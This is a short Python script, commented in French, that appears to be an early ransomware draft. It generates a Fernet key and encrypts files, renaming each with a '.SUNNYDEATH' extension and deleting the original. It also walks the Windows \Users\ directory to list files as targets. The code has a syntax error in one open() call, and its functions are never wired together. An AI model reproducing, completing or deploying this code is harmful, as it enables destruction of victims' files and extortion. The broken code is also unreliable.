#!/usr/bin/python3
#coding:utf-8

import os
from cryptography.fernet import Fernet

current_drive = os.environ['SystemDrive']

def creation_de_clef(nom_de_ma_clef):
    global key
    key = Fernet.generate_key()
    with open(f"{nom_de_ma_clef}.key", "wb") as key_file:
        key_file.write(key)

############################
def chiffrement_des_donnees(key, fichier_a_chiffrer):
    with open(fichier_a_chiffrer "rb") as files:
        donnees = files.read()

    my_key = Fernet(key)
    donnees_chiffrer = my_key.encrypt(donnees)
    nouveau_fichier = fichier_a_chiffrer + ".SUNNYDEATH"

    with open(nouveau_fichier, "wb") as new_file:
        new_file.write(donnees_chiffrer)

    os.remove(fichier_a_chiffrer)

##############################
def lister_les_donnees():
    repertoire_cible = ["\\Users\\"]
    for users in repertoire_cible:
        for path, subdirs, files in os.walk(users):
            for name in files:
                print(name)
